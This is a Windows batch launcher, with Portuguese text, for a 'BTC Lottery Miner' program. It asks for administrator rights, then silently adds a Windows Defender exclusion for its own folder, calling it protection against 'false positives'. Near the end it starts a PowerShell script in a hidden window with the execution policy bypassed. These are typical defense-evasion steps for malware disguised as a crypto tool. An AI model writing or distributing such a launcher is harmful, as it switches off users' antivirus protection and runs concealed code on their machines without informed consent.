@echo off
cd /d "%~dp0"
title Software BTC Lottery Miner - Iniciando...
color 0E

:: ==========================================
:: SOLICITA PRIVILEGIOS DE ADMINISTRADOR
:: Necessario para configurar o Antivirus e Node.js
:: ==========================================
net session >nul 2>&1
if %errorLevel% == 0 (
    goto :admin
) else (
    echo.
    echo  [!] Solicitando permissao de Administrador...
    powershell -Command "Start-Process '%~dpnx0' -Verb RunAs"
    exit /b
)
:admin
cd /d "%~dp0"

echo.
echo  =========================================
echo    Software BTC Lottery Miner - Iniciando...
echo  =========================================
echo.

:: Verifica se esta rodando de dentro do arquivo ZIP sem extrair
echo "%~dp0" | findstr /i "Temp" >nul
if %errorlevel% equ 0 (
    echo.
    echo  [!] ERRO: VOCE ESTA RODANDO O ARQUIVO DE DENTRO DO ZIP!
    echo  [!] Para o sistema funcionar, voce precisa primeiro EXTRAIR a pasta.
    echo.
    echo  COMO RESOLVER:
    echo  1. Clique com o botao direito no arquivo .zip
    echo  2. Selecione "Extrair Tudo..." ou "Extract Here"
    echo  3. Entre na nova pasta extraida e rode o INICIAR novamente.
    echo.
    pause
    exit /b
)

:: Tenta adicionar exclusao no Windows Defender para evitar falsos positivos (requer admin, falha silenciosamente se nao tiver)
powershell -Command "Add-MpPreference -ExclusionPath '%~dp0'" >nul 2>&1

:: Verifica se Node.js esta instalado
where node >nul 2>&1
if %errorlevel% neq 0 (
    echo  [!] Node.js nao foi encontrado no seu computador!
    echo  [!] Para o minerador funcionar, voce precisa do motor Node.js.
    echo.
    echo  Abrindo o site oficial para download em 3 segundos...
    timeout /t 3 /nobreak >nul
    start https://nodejs.org/en/download/prebuilt-installer
    echo.
    echo  PASSOS:
    echo  1. Baixe o instalador no site que abriu e instale ^(basta clicar em Next/Avancar^).
    echo  2. Reinicie o seu computador.
    echo  3. Clique neste arquivo INICIAR novamente.
    echo.
    pause
    exit /b 0
)

:: Verifica se a pasta node_modules existe, senao instala as dependencias
if not exist "%~dp0node_modules\" (
    echo.
    echo  [+] Instalando dependencias do sistema pela primeira vez...
    echo  [+] Isso pode demorar alguns segundos, aguarde.
    call npm install
)

:: Cria atalho na Area de Trabalho automaticamente com icone do Bitcoin
powershell -Command "$path=[Environment]::GetFolderPath('Desktop')+'\Software BTC Lottery Miner.lnk'; $s=(New-Object -COM WScript.Shell).CreateShortcut($path); $s.TargetPath='%~dpnx0'; $s.WorkingDirectory='%~dp0'; $s.IconLocation='%~dp0public\bitcoin_hd.ico'; $s.Save()" >nul 2>&1

:: Inicia o PowerShell ignorando a politica de execucao, de forma invisivel
:: O tray_icon.ps1 vai matar processos antigos, subir o servidor, colocar o icone e abrir o painel
start /min powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%~dp0tray_icon.ps1"
exit
